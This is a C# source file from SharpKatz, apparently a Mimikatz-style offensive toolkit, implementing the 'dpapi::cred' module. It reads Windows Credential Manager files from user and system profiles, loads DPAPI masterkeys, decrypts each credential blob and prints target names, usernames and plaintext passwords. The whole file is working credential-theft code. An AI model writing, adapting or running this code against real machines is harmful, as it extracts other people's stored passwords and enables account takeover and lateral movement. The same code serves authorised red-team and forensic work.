//
// Author: Johto
// Project: SharpKatz (https://github.com/b4rtik/SharpKatz)
// License: BSD 3-Clause
// Module: dpapi::cred - Decrypt Windows Credential Manager files
//
// Credential files are stored in:
//   %APPDATA%\Microsoft\Credentials\         (user credentials)
//   %SYSTEMROOT%\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\ (system)
//
// Each file is a DPAPI blob wrapping a CREDENTIAL structure.
//

using System;
using System.IO;
using System.Text;

namespace SharpKatz.Module
{
    class DpapiCred
    {
        // Credential file header (wraps the DPAPI blob)
        // Offset 0: DWORD dwVersion (1)
        // Offset 4: DWORD dwSize
        // Offset 8: DWORD dwUnk0
        // Offset 12: DPAPI blob starts

        // Decrypted credential inner structure (version 1):
        // Offset 0:  DWORD credVersion
        // Offset 4:  DWORD credSize
        // Offset 8:  DWORD credUnk
        // Offset 12: DWORD type
        // Offset 16: DWORD flags
        // Offset 20: FILETIME lastWritten (8 bytes)
        // Offset 28: DWORD unkFlagsOrSize
        // Offset 32: DWORD persist
        // Offset 36: DWORD attributeCount
        // Offset 40: DWORD unk0
        // Offset 44: DWORD unk1
        // Offset 48: Strings follow (length-prefixed UTF-16):
        //   TargetName, TargetAlias, Comment, UnkData,
        //   then DWORD cbCredentialBlob + CredentialBlob bytes,
        //   then UserName

        /// <summary>
        /// Entry point for dpapi::cred
        /// Decrypt a Windows Credential Manager file
        /// </summary>
        public static bool DecryptCredentialFile(string credFile, string masterkeyHex, string mkGuid, string mkFile)
        {
            Console.WriteLine("\n  [*] dpapi::cred");

            // Load masterkeys
            if (!string.IsNullOrEmpty(mkFile))
            {
                int loaded = DpapiBlob.LoadMasterkeysFromFile(mkFile);
                Console.WriteLine("   [*] Loaded {0} masterkey(s) from file", loaded);
            }

            if (!string.IsNullOrEmpty(mkGuid) && !string.IsNullOrEmpty(masterkeyHex))
            {
                byte[] mk = DpapiMasterkey.HexStringToBytes(masterkeyHex);
                if (mk != null)
                {
                    DpapiBlob.AddMasterkey(mkGuid, mk);
                    Console.WriteLine("   [*] Added masterkey {0}", mkGuid);
                }
            }

            if (!File.Exists(credFile))
            {
                Console.WriteLine("   [-] Credential file not found: {0}", credFile);
                return false;
            }

            byte[] fileData = File.ReadAllBytes(credFile);
            Console.WriteLine("   [*] File: {0} ({1} bytes)", credFile, fileData.Length);

            return DecryptCredential(fileData);
        }

        /// <summary>
        /// Enumerate and decrypt all credential files in a directory
        /// </summary>
        public static int DecryptCredentialDir(string credDir, string masterkeyHex, string mkGuid, string mkFile)
        {
            Console.WriteLine("\n  [*] dpapi::cred (directory mode)");

            // Load masterkeys
            if (!string.IsNullOrEmpty(mkFile))
            {
                int loaded = DpapiBlob.LoadMasterkeysFromFile(mkFile);
                Console.WriteLine("   [*] Loaded {0} masterkey(s) from file", loaded);
            }

            if (!string.IsNullOrEmpty(mkGuid) && !string.IsNullOrEmpty(masterkeyHex))
            {
                byte[] mk = DpapiMasterkey.HexStringToBytes(masterkeyHex);
                if (mk != null)
                {
                    DpapiBlob.AddMasterkey(mkGuid, mk);
                    Console.WriteLine("   [*] Added masterkey {0}", mkGuid);
                }
            }

            if (!Directory.Exists(credDir))
            {
                Console.WriteLine("   [-] Directory not found: {0}", credDir);
                return 0;
            }

            int count = 0;
            string[] files = Directory.GetFiles(credDir);
            Console.WriteLine("   [*] Found {0} file(s) in {1}", files.Length, credDir);

            foreach (string file in files)
            {
                try
                {
                    byte[] fileData = File.ReadAllBytes(file);

                    // Quick check: valid credential file starts with version 1
                    if (fileData.Length < 16)
                        continue;

                    uint version = BitConverter.ToUInt32(fileData, 0);
                    if (version != 1 && version != 2)
                        continue;

                    Console.WriteLine("\n   ────────────────────────────────────");
                    Console.WriteLine("   [*] File: {0} ({1} bytes)", Path.GetFileName(file), fileData.Length);

                    if (DecryptCredential(fileData))
                        count++;
                }
                catch (Exception ex)
                {
                    Console.WriteLine("   [-] Error reading {0}: {1}", Path.GetFileName(file), ex.Message);
                }
            }

            Console.WriteLine("\n   [+] Decrypted {0} credential(s)", count);
            return count;
        }

        /// <summary>
        /// Parse and decrypt a credential file blob
        /// </summary>
        private static bool DecryptCredential(byte[] fileData)
        {
            if (fileData == null || fileData.Length < 16)
            {
                Console.WriteLine("   [-] File too small");
                return false;
            }

            // Parse credential file header
            uint version = BitConverter.ToUInt32(fileData, 0);
            uint size = BitConverter.ToUInt32(fileData, 4);
            uint unk0 = BitConverter.ToUInt32(fileData, 8);

            Console.WriteLine("   [*] Credential file version: {0}", version);

            // The DPAPI blob starts at offset 12
            int blobOffset = 12;
            if (blobOffset >= fileData.Length)
            {
                Console.WriteLine("   [-] No DPAPI blob in credential file");
                return false;
            }

            byte[] blobData = new byte[fileData.Length - blobOffset];
            Array.Copy(fileData, blobOffset, blobData, 0, blobData.Length);

            // First, show the blob info (masterkey GUID etc.) without decrypting
            // Parse DPAPI blob header to show MK GUID
            if (blobData.Length >= 60)
            {
                uint blobVersion = BitConverter.ToUInt32(blobData, 0);
                if (blobVersion == 1)
                {
                    byte[] guidBytes = new byte[16];
                    Array.Copy(blobData, 24, guidBytes, 0, 16);
                    Guid mkGuidVal = new Guid(guidBytes);
                    Console.WriteLine("   [*] Masterkey GUID: {{{0}}}", mkGuidVal);
                }
            }

            // Decrypt the DPAPI blob using existing infrastructure
            // We need a way to get decrypted bytes without printing blob info again
            // Use DecryptBlobBytes if masterkey is available, otherwise fall back to full DecryptBlob
            byte[] decrypted = TryDecryptBlob(blobData);
            if (decrypted == null)
            {
                Console.WriteLine("   [-] Decryption failed (masterkey not available or wrong)");
                return false;
            }

            Console.WriteLine("   [+] DPAPI blob decrypted ({0} bytes)", decrypted.Length);

            // Parse the decrypted credential structure
            ParseDecryptedCredential(decrypted);
            return true;
        }

        /// <summary>
        /// Try to decrypt blob using cached masterkeys
        /// </summary>
        private static byte[] TryDecryptBlob(byte[] blobData)
        {
            // Parse blob header to get masterkey GUID
            if (blobData.Length < 60)
                return null;

            uint blobVer = BitConverter.ToUInt32(blobData, 0);
            if (blobVer != 1)
                return null;

            // MK GUID at offset 24 (after version=4, provider_guid=16, mk_version=4)
            byte[] guidBytes = new byte[16];
            Array.Copy(blobData, 24, guidBytes, 0, 16);
            Guid mkGuid = new Guid(guidBytes);

            string guidStr = mkGuid.ToString().ToLowerInvariant();

            // Use DpapiBlob's infrastructure
            // DpapiBlob.DecryptBlob prints info, we just want the bytes
            // Add the masterkey lookup and call DecryptBlobBytes
            // This is a simplified path — we call the full decrypt
            return DpapiBlob.DecryptBlobBytesWithCache(blobData);
        }

        /// <summary>
        /// Parse the decrypted CREDENTIAL structure
        /// </summary>
        private static void ParseDecryptedCredential(byte[] data)
        {
            if (data == null || data.Length < 48)
            {
                Console.WriteLine("   [-] Decrypted data too small for credential structure");
                Console.Write("   [*] Raw (hex): ");
                Console.WriteLine(Utility.PrintHashBytes(data));
                return;
            }

            try
            {
                int offset = 0;

                uint credVersion = BitConverter.ToUInt32(data, offset); offset += 4;
                uint credSize = BitConverter.ToUInt32(data, offset); offset += 4;
                uint credUnk = BitConverter.ToUInt32(data, offset); offset += 4;

                Console.WriteLine("\n   ** CREDENTIAL **");
                Console.WriteLine("   Version     : {0}", credVersion);

                if (credVersion == 1)
                {
                    uint type = BitConverter.ToUInt32(data, offset); offset += 4;
                    uint flags = BitConverter.ToUInt32(data, offset); offset += 4;

                    long lastWrittenFt = BitConverter.ToInt64(data, offset); offset += 8;
                    DateTime lastWritten;
                    try { lastWritten = DateTime.FromFileTimeUtc(lastWrittenFt); }
                    catch { lastWritten = DateTime.MinValue; }

                    uint unkFlagsOrSize = BitConverter.ToUInt32(data, offset); offset += 4;
                    uint persist = BitConverter.ToUInt32(data, offset); offset += 4;
                    uint attributeCount = BitConverter.ToUInt32(data, offset); offset += 4;
                    uint unk0val = BitConverter.ToUInt32(data, offset); offset += 4;
                    uint unk1val = BitConverter.ToUInt32(data, offset); offset += 4;

                    Console.WriteLine("   Type        : {0} ({1})", type, CredTypeToString(type));
                    Console.WriteLine("   Flags       : 0x{0:X8}", flags);
                    Console.WriteLine("   Last Written: {0}", lastWritten != DateTime.MinValue ? lastWritten.ToString("yyyy-MM-dd HH:mm:ss UTC") : "(unknown)");
                    Console.WriteLine("   Persist     : {0} ({1})", persist, PersistToString(persist));
                    Console.WriteLine("   Attributes  : {0}", attributeCount);

                    // Read length-prefixed strings
                    string targetName = ReadLenPrefixedUnicode(data, ref offset);
                    string targetAlias = ReadLenPrefixedUnicode(data, ref offset);
                    string comment = ReadLenPrefixedUnicode(data, ref offset);
                    string unkData = ReadLenPrefixedUnicode(data, ref offset);

                    // Credential blob (password/secret)
                    byte[] credBlob = null;
                    if (offset + 4 <= data.Length)
                    {
                        uint cbCredBlob = BitConverter.ToUInt32(data, offset); offset += 4;
                        if (cbCredBlob > 0 && offset + cbCredBlob <= data.Length)
                        {
                            credBlob = new byte[cbCredBlob];
                            Array.Copy(data, offset, credBlob, 0, (int)cbCredBlob);
                            offset += (int)cbCredBlob;
                        }
                    }

                    // Username
                    string userName = ReadLenPrefixedUnicode(data, ref offset);

                    Console.WriteLine("   TargetName  : {0}", targetName ?? "(null)");
                    if (!string.IsNullOrEmpty(targetAlias))
                        Console.WriteLine("   TargetAlias : {0}", targetAlias);
                    if (!string.IsNullOrEmpty(comment))
                        Console.WriteLine("   Comment     : {0}", comment);
                    Console.WriteLine("   UserName    : {0}", userName ?? "(null)");

                    if (credBlob != null && credBlob.Length > 0)
                    {
                        // Try to interpret as UTF-16 text (most common for passwords)
                        bool isText = IsLikelyText(credBlob);
                        if (isText)
                        {
                            string password = Encoding.Unicode.GetString(credBlob).TrimEnd('\0');
                            Console.WriteLine("   CredBlob    : {0}", password);
                        }
                        else
                        {
                            Console.Write("   CredBlob    : ");
                            Console.WriteLine(Utility.PrintHashBytes(credBlob));
                        }
                    }
                    else
                    {
                        Console.WriteLine("   CredBlob    : (empty)");
                    }

                    // Parse attributes if any
                    if (attributeCount > 0 && attributeCount < 100)
                    {
                        Console.WriteLine("   Attributes:");
                        for (uint i = 0; i < attributeCount && offset + 8 <= data.Length; i++)
                        {
                            ParseCredentialAttribute(data, ref offset, i);
                        }
                    }
                }
                else if (credVersion == 2)
                {
                    // Version 2 has slightly different layout
                    // Same concept, different offsets
                    Console.WriteLine("   (Version 2 credential — raw display)");
                    PrintRawCredential(data, offset);
                }
                else
                {
                    Console.WriteLine("   (Unknown version — raw display)");
                    Console.Write("   Raw (hex): ");
                    Console.WriteLine(Utility.PrintHashBytes(data));
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("   [-] Error parsing credential: {0}", ex.Message);
                Console.Write("   Raw (hex): ");
                Console.WriteLine(Utility.PrintHashBytes(data));
            }
        }

        /// <summary>
        /// Read a length-prefixed Unicode string from buffer
        /// Format: DWORD length (in bytes) + UTF-16LE chars
        /// </summary>
        private static string ReadLenPrefixedUnicode(byte[] data, ref int offset)
        {
            if (offset + 4 > data.Length)
                return null;

            uint len = BitConverter.ToUInt32(data, offset);
            offset += 4;

            if (len == 0)
                return null;

            if (offset + len > data.Length)
            {
                offset = data.Length;
                return null;
            }

            string result = Encoding.Unicode.GetString(data, offset, (int)len).TrimEnd('\0');
            offset += (int)len;
            return result;
        }

        /// <summary>
        /// Parse a single credential attribute
        /// </summary>
        private static void ParseCredentialAttribute(byte[] data, ref int offset, uint index)
        {
            if (offset + 8 > data.Length)
                return;

            uint flags = BitConverter.ToUInt32(data, offset); offset += 4;
            string keyword = ReadLenPrefixedUnicode(data, ref offset);
            uint valueLen = 0;
            if (offset + 4 <= data.Length)
            {
                valueLen = BitConverter.ToUInt32(data, offset);
                offset += 4;
            }

            byte[] value = null;
            if (valueLen > 0 && offset + valueLen <= data.Length)
            {
                value = new byte[valueLen];
                Array.Copy(data, offset, value, 0, (int)valueLen);
                offset += (int)valueLen;
            }

            Console.Write("    [{0}] {1} = ", index, keyword ?? "(unnamed)");
            if (value != null)
            {
                if (IsLikelyText(value))
                    Console.WriteLine(Encoding.Unicode.GetString(value).TrimEnd('\0'));
                else
                    Console.WriteLine(Utility.PrintHashBytes(value));
            }
            else
            {
                Console.WriteLine("(empty)");
            }
        }

        /// <summary>
        /// Print credential data in raw format (fallback)
        /// </summary>
        private static void PrintRawCredential(byte[] data, int startOffset)
        {
            // Try to find readable strings in the data
            int pos = startOffset;
            while (pos + 4 <= data.Length)
            {
                // Look for length-prefixed strings
                uint possibleLen = BitConverter.ToUInt32(data, pos);
                if (possibleLen > 0 && possibleLen < 1024 && pos + 4 + possibleLen <= data.Length)
                {
                    byte[] chunk = new byte[possibleLen];
                    Array.Copy(data, pos + 4, chunk, 0, (int)possibleLen);
                    if (IsLikelyText(chunk))
                    {
                        string text = Encoding.Unicode.GetString(chunk).TrimEnd('\0');
                        if (!string.IsNullOrEmpty(text))
                            Console.WriteLine("   String @ 0x{0:X}: {1}", pos, text);
                    }
                }
                pos += 4;
            }

            Console.Write("   Full hex: ");
            Console.WriteLine(Utility.PrintHashBytes(data));
        }

        /// <summary>
        /// Check if byte array looks like UTF-16LE text
        /// </summary>
        private static bool IsLikelyText(byte[] data)
        {
            if (data == null || data.Length < 2 || data.Length % 2 != 0)
                return false;

            int printable = 0;
            int total = 0;
            for (int i = 0; i < data.Length - 1; i += 2)
            {
                ushort c = BitConverter.ToUInt16(data, i);
                total++;
                if (c == 0) continue; // null terminator
                if (c >= 0x20 && c < 0xFFFE) printable++;
                else if (c == 0x09 || c == 0x0A || c == 0x0D) printable++; // tab, LF, CR
                else return false; // control char
            }
            return total > 0 && printable > 0;
        }

        private static string CredTypeToString(uint type)
        {
            switch (type)
            {
                case 1: return "CRED_TYPE_GENERIC";
                case 2: return "CRED_TYPE_DOMAIN_PASSWORD";
                case 3: return "CRED_TYPE_DOMAIN_CERTIFICATE";
                case 4: return "CRED_TYPE_DOMAIN_VISIBLE_PASSWORD";
                case 5: return "CRED_TYPE_GENERIC_CERTIFICATE";
                case 6: return "CRED_TYPE_DOMAIN_EXTENDED";
                default: return "Unknown";
            }
        }

        private static string PersistToString(uint persist)
        {
            switch (persist)
            {
                case 1: return "CRED_PERSIST_SESSION";
                case 2: return "CRED_PERSIST_LOCAL_MACHINE";
                case 3: return "CRED_PERSIST_ENTERPRISE";
                default: return "Unknown";
            }
        }
    }
}
